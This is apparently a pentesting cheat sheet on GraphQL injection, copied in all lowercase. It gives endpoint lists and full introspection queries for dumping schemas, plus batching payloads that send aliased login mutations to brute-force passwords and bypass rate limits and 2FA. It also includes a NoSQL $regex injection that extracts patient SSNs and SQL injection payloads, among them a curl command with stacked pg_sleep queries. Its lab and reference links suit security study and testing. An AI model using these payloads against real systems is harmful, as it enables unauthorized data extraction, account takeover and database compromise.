# graphql injection

> graphql is a query language for apis and a runtime for fulfilling those queries with existing data. a graphql service is created by defining types and fields on those types, then providing functions for each field on each type


## summary

- [tools](#tools)
- [enumeration](#enumeration)
  - [common graphql endpoints](#common-graphql-endpoints)
  - [identify an injection point](#identify-an-injection-point)
  - [enumerate database schema via introspection](#enumerate-database-schema-via-introspection)
  - [enumerate database schema via suggestions](#enumerate-database-schema-via-suggestions)
  - [enumerate types definition](#enumerate-types-definition)
  - [list path to reach a type](#list-path-to-reach-a-type)
- [methodology](#methodology)
  - [extract data](#extract-data)
  - [extract data using edges/nodes](#extract-data-using-edgesnodes)
  - [extract data using projections](#extract-data-using-projections)
  - [mutations](#mutations)
  - [graphql batching attacks](#graphql-batching-attacks)
    - [json list based batching](#json-list-based-batching)
    - [query name based batching](#query-name-based-batching)
- [injections](#injections)
    - [nosql injection](#nosql-injection)
    - [sql injection](#sql-injection)
- [labs](#labs)
- [references](#references)


## tools

* [swisskyrepo/graphqlmap](https://github.com/swisskyrepo/graphqlmap) - scripting engine to interact with a graphql endpoint for pentesting purposes
* [doyensec/graph-ql](https://github.com/doyensec/graph-ql/) - graphql security research material
* [doyensec/inql](https://github.com/doyensec/inql) - a burp extension for graphql security testing
* [doyensec/gqlspection](https://github.com/doyensec/gqlspection) - gqlspection - parses graphql introspection schema and generates possible queries
* [dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum) - lists the different ways of reaching a given type in a graphql schema
* [andev-software/graphql-ide](https://github.com/andev-software/graphql-ide) - an extensive ide for exploring graphql api's
* [mchoji/clairvoyancex](https://github.com/mchoji/clairvoyancex) - obtain graphql api schema despite disabled introspection
* [nicholasaleks/crackql](https://github.com/nicholasaleks/crackql) - a graphql password brute-force and fuzzing utility
* [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - graphql threat framework used by security professionals to research security gaps in graphql implementations
* [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - security auditor utility for graphql apis
* [ivangoncharov/graphql-voyager](https://github.com/ivangoncharov/graphql-voyager) - represent any graphql api as an interactive graph
* [insomnia](https://insomnia.rest/) - cross-platform http and graphql client


## enumeration

### common graphql endpoints

most of the time graphql is located at the `/graphql` or `/graphiql` endpoint. 
a more complete list is available at [danielmiessler/seclists/graphql.txt](https://github.com/danielmiessler/seclists/blob/fe2aa9e7b04b98d94432320d09b5987f39a17de8/discovery/web-content/graphql.txt).

```ps1
/v1/explorer
/v1/graphiql
/graph
/graphql
/graphql/console/
/graphql.php
/graphiql
/graphiql.php
```


### identify an injection point

```js
example.com/graphql?query={__schema{types{name}}}
example.com/graphiql?query={__schema{types{name}}}
```

check if errors are visible.

```javascript
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```


### enumerate database schema via introspection

url encoded query to dump the database schema.

```js
fragment+fulltype+on+__type+{++kind++name++description++fields(includedeprecated%3a+true)+{++++name++++description++++args+{++++++...inputvalue++++}++++type+{++++++...typeref++++}++++isdeprecated++++deprecationreason++}++inputfields+{++++...inputvalue++}++interfaces+{++++...typeref++}++enumvalues(includedeprecated%3a+true)+{++++name++++description++++isdeprecated++++deprecationreason++}++possibletypes+{++++...typeref++}}fragment+inputvalue+on+__inputvalue+{++name++description++type+{++++...typeref++}++defaultvalue}fragment+typeref+on+__type+{++kind++name++oftype+{++++kind++++name++++oftype+{++++++kind++++++name++++++oftype+{++++++++kind++++++++name++++++++oftype+{++++++++++kind++++++++++name++++++++++oftype+{++++++++++++kind++++++++++++name++++++++++++oftype+{++++++++++++++kind++++++++++++++name++++++++++++++oftype+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+introspectionquery+{++__schema+{++++querytype+{++++++name++++}++++mutationtype+{++++++name++++}++++types+{++++++...fulltype++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...inputvalue++++++}++++}++}}
```

url decoded query to dump the database schema.

```javascript
fragment fulltype on __type {
  kind
  name
  description
  fields(includedeprecated: true) {
    name
    description
    args {
      ...inputvalue
    }
    type {
      ...typeref
    }
    isdeprecated
    deprecationreason
  }
  inputfields {
    ...inputvalue
  }
  interfaces {
    ...typeref
  }
  enumvalues(includedeprecated: true) {
    name
    description
    isdeprecated
    deprecationreason
  }
  possibletypes {
    ...typeref
  }
}
fragment inputvalue on __inputvalue {
  name
  description
  type {
    ...typeref
  }
  defaultvalue
}
fragment typeref on __type {
  kind
  name
  oftype {
    kind
    name
    oftype {
      kind
      name
      oftype {
        kind
        name
        oftype {
          kind
          name
          oftype {
            kind
            name
            oftype {
              kind
              name
              oftype {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

query introspectionquery {
  __schema {
    querytype {
      name
    }
    mutationtype {
      name
    }
    types {
      ...fulltype
    }
    directives {
      name
      description
      locations
      args {
        ...inputvalue
      }
    }
  }
}
```

single line queries to dump the database schema without fragments.

```js
__schema{querytype{name},mutationtype{name},types{kind,name,description,fields(includedeprecated:true){name,description,args{name,description,type{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name}}}}}}}},defaultvalue},type{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name}}}}}}}},isdeprecated,deprecationreason},inputfields{name,description,type{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name}}}}}}}},defaultvalue},interfaces{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name}}}}}}}},enumvalues(includedeprecated:true){name,description,isdeprecated,deprecationreason,},possibletypes{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name,oftype{kind,name}}}}}}}},defaultvalue}}}
```

```js
{__schema{querytype{name}mutationtype{name}subscriptiontype{name}types{...fulltype}directives{name description locations args{...inputvalue}}}}fragment fulltype on __type{kind name description fields(includedeprecated:true){name description args{...inputvalue}type{...typeref}isdeprecated deprecationreason}inputfields{...inputvalue}interfaces{...typeref}enumvalues(includedeprecated:true){name description isdeprecated deprecationreason}possibletypes{...typeref}}fragment inputvalue on __inputvalue{name description type{...typeref}defaultvalue}fragment typeref on __type{kind name oftype{kind name oftype{kind name oftype{kind name oftype{kind name oftype{kind name oftype{kind name oftype{kind name}}}}}}}}
```


### enumerate database schema via suggestions

when you use an unknown keyword, the graphql backend will respond with a suggestion related to its schema.

```json
{
  "message": "cannot query field \"one\" on type \"query\". did you mean \"node\"?",
}
```

you can also try to bruteforce known keywords, field and type names using wordlists such as [escape-technologies/graphql-wordlist](https://github.com/escape-technologies/graphql-wordlist) when the schema of a graphql api is not accessible.



### enumerate types definition

enumerate the definition of interesting types using the following graphql query, replacing "user" with the chosen type

```javascript
{__type (name: "user") {name fields{name type{name kind oftype{name kind}}}}}
```


### list path to reach a type

```php
$ git clone https://gitlab.com/dee-see/graphql-path-enum
$ graphql-path-enum -i ./test_data/h1_introspection.json -t skill
found 27 ways to reach the "skill" node from the "query" node:
- query (assignable_teams) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (checklist_check) -> checklistcheck (checklist) -> checklist (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (checklist_check_response) -> checklistcheckresponse (checklist_check) -> checklistcheck (checklist) -> checklist (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (checklist_checks) -> checklistcheck (checklist) -> checklist (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (clusters) -> cluster (weaknesses) -> weakness (critical_reports) -> teammembergroupconnection (edges) -> teammembergroupedge (node) -> teammembergroup (team_members) -> teammember (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (embedded_submission_form) -> embeddedsubmissionform (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (external_program) -> externalprogram (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (external_programs) -> externalprogram (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (job_listing) -> joblisting (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (job_listings) -> joblisting (team) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (me) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (pentest) -> pentest (lead_pentester) -> pentester (user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (pentests) -> pentest (lead_pentester) -> pentester (user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (query) -> query (assignable_teams) -> team (audit_log_items) -> auditlogitem (source_user) -> user (pentester_profile) -> pentesterprofile (skills) -> skill
- query (query) -> query (skills) -> skill
```


## methodology

### extract data

```js
example.com/graphql?query={type_1{field_1,field_2}}
```


[image extracted text: [image not found]]




### extract data using edges/nodes

```json
{
  "query": "query {
    teams{
      total_count,edges{
        node{
          id,_id,about,handle,state
        }
      }
    }
  }"
} 
```

### extract data using projections

:warning: don’t forget to escape the " inside the **options**.

```js
{doctors(options: "{\"patients.ssn\" :1}"){firstname lastname id patients{ssn}}}
```


### mutations

mutations work like function, you can use them to interact with the graphql.

```javascript
# mutation{signin(login:"admin", password:"secretp@ssw0rd"){token}}
# mutation{adduser(id:"1", name:"dan abramov", email:"dan@dan.com") {id name email}}
```


### graphql batching attacks

common scenario:
* password brute-force amplification scenario
* rate limit bypass
* 2fa bypassing


#### json list based batching

> query batching is a feature of graphql that allows multiple queries to be sent to the server in a single http request. instead of sending each query in a separate request, the client can send an array of queries in a single post request to the graphql server. this reduces the number of http requests and can improve the performance of the application.

query batching works by defining an array of operations in the request body. each operation can have its own query, variables, and operation name. the server processes each operation in the array and returns an array of responses, one for each query in the batch.

```json
[
    {
        "query":"..."
    },{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ,{
        "query":"..."
    }
    ...
]
```


#### query name based batching

```json
{
    "query": "query { qname: query { field1 } qname1: query { field1 } }"
}
```

send the same mutation several times using aliases

```js
mutation {
  login(pass: 1111, username: "bob")
  second: login(pass: 2222, username: "bob")
  third: login(pass: 3333, username: "bob")
  fourth: login(pass: 4444, username: "bob")
}
```


## injections

> sql and nosql injections are still possible since graphql is just a layer between the client and the database.


### nosql injection

use `$regex`, `$ne` from []() inside a `search` parameter.

```js
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": \".*\"}, \"lastname\":\"admin\" }")
    {
      firstname lastname id patients{ssn}
    }
}
```


### sql injection

send a single quote `'` inside a graphql parameter to trigger the sql injection

```js
{ 
    bacon(id: "1'") { 
        id, 
        type, 
        price
    }
}
```

simple sql injection inside a graphql field.

```powershell
curl -x post http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3bselect%201%3bselect%20pg_sleep\(30\)%3b--%27
```


## labs

* [portswigger - accessing private graphql posts](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
* [portswigger - accidental exposure of private graphql fields](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
* [portswigger - finding a hidden graphql endpoint](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
* [portswigger - bypassing graphql brute force protections](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
* [portswigger - performing csrf exploits over graphql](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
* [root me - graphql - introspection](https://www.root-me.org/fr/challenges/web-serveur/graphql-introspection)
* [root me - graphql - injection](https://www.root-me.org/fr/challenges/web-serveur/graphql-injection)
* [root me - graphql - backend injection](https://www.root-me.org/fr/challenges/web-serveur/graphql-backend-injection)
* [root me - graphql - mutation](https://www.root-me.org/fr/challenges/web-serveur/graphql-mutation)


## references

- [building a free open source graphql wordlist for penetration testing - nohé hinniger-foray - august 17, 2023](https://escape.tech/blog/graphql-security-wordlist/)
- [exploiting graphql - assetnote - shubham shah - august 29, 2021](https://blog.assetnote.io/2021/08/29/exploiting-graphql/)
- [graphql batching attack - wallarm - december 13, 2019](https://lab.wallarm.com/graphql-batching-attack/)
- [graphql for pentesters presentation - alexandre zanni (@noraj) - december 1, 2022](https://acceis.github.io/prez-graphql/)
* [api hacking graphql - @ghostlulz - jun 8, 2019](https://medium.com/@ghostlulzhacks/api-hacking-graphql-7b2866ba1cf2)
* [discovering graphql endpoints and sqli vulnerabilities - matías choren - sep 23, 2018](https://medium.com/@localh0t/discovering-graphql-endpoints-and-sqli-vulnerabilities-5d39f26cea2e)
* [graphql abuse: bypass account level permissions through parameter smuggling - jon bottarini - march 14, 2018](https://labs.detectify.com/2018/03/14/graphql-abuse/)
* [graphql bug to steal anyone's address - pratik yadav - sept 1, 2019](https://medium.com/@pratiky054/graphql-bug-to-steal-anyones-address-fc34f0374417)
* [graphql cheatsheet - devhints.io - november 7, 2018](https://devhints.io/graphql)
* [graphql introspection - graphql - august 21, 2024](https://graphql.org/learn/introspection/)
* [graphql nosql injection through json types - pete corey - june 12, 2017](http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/)
* [hip19 writeup - meet your doctor 1,2,3 - swissky - june 22, 2019](https://swisskyrepo.github.io/hip19-meetyourdoctor/)
* [how to set up a graphql server using node.js, express & mongodb - leonardo maldonado - 5 november 2018](https://www.freecodecamp.org/news/how-to-set-up-a-graphql-server-using-node-js-express-mongodb-52421b73f474/)
* [introduction to graphql - graphql - november 1, 2024](https://graphql.org/learn/)
* [introspection query leaks sensitive graphql system information - @zuriel - november 18, 2017](https://hackerone.com/reports/291531)
* [looting graphql endpoints for fun and profit - @theraz0r - 8 june 2017](https://raz0r.name/articles/looting-graphql-endpoints-for-fun-and-profit/)
* [securing your graphql api from malicious queries - max stoiber - feb 21, 2018](https://web.archive.org/web/20180731231915/https://blog.apollographql.com/securing-your-graphql-api-from-malicious-queries-16130a324a6b)
* [sql injection in graphql endpoint through embedded_submission_form_uuid parameter - jobert abma (jobert) - nov 6th 2018](https://hackerone.com/reports/435066)